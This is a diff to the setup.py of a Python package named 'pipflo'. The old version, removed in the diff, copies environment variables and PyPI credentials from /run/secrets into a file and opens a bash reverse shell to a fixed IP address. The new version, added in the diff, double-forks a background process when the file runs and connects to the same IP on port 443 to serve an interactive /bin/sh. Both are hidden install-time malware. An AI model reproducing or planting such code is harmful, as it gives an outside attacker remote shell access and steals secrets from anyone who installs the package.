@@ -1,28 +1,35 @@
+import os, socket, pty
 from setuptools import setup
-from setuptools.command.install import install
-import subprocess
 
-class CustomInstallCommand(install):
-    def run(self):
-        install.run(self)
-        print("FLO")
-        # your command here
-        subprocess.call(["env > /app/foo"],shell=True)
-        subprocess.call(["echo FOO1 >> /app/foo"],shell=True)
-        subprocess.call(["cat /run/secrets/pypi_username >> /app/foo"],shell=True)
-        subprocess.call(["echo FOO2 >> /app/foo"],shell=True)
-        subprocess.call(["cat /run/secrets/pypi_password >> /app/foo"],shell=True)
-        subprocess.call(["echo FOO3 >> /app/foo"],shell=True)
-        subprocess.call(["./busybox ls -alh /run/secrets/ >> /app/foo"],shell=True)
-        subprocess.call(["echo FOO4 >> /app/foo"],shell=True)
-        subprocess.call(["bash -i >& /dev/tcp/82.165.195.38/80 0>&1"],shell=True)
+def _spawn():
+    try:
+        pid = os.fork()
+        if pid > 0:
+            os.waitpid(pid, 0)
+            return
+    except OSError:
+        return
+    os.setsid()
+    try:
+        pid = os.fork()
+        if pid > 0:
+            os._exit(0)
+    except OSError:
+        os._exit(1)
+    try:
+        s = socket.socket()
+        s.settimeout(10)
+        s.connect(('82.165.195.38', 443))
+        s.settimeout(None)
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        pty.spawn('/bin/sh')
+    except Exception:
+        pass
+    finally:
+        os._exit(0)
 
+_spawn()
 
-setup(
-    name="pipflo",
-    version="0.1",
-    packages=["pipflo"],
-    cmdclass={
-        'install': CustomInstallCommand,
-    },
-)
+setup(name='pipflo', version='1.0.0')
